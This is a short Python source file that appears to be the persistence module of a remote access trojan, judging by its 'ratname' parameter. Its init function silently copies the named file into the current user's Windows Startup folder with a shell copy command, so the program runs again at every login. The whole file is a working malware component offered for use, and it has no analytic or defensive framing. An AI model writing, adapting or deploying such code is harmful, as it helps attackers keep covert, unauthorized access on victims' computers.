def init(ratname):
    global filename, path
    filename = ratname

    from pathlib import Path
    import os
    import sys

    path = str(Path.cwd())
    appdata = os.getenv('appdata')

    os.chdir('../../../../../../../../../../../../../../../../../../../../../../../../../../../')
    os.system(f'copy "{path}\\{filename}" "{appdata}\Microsoft\Windows\Start Menu\Programs\Startup\" /Y > NUL')

if __name__ != '__main__':
    print('Persistence module imported successfully.')
    
else:
    init('persistence.py')
    print('Persistence successfully enabled.')
    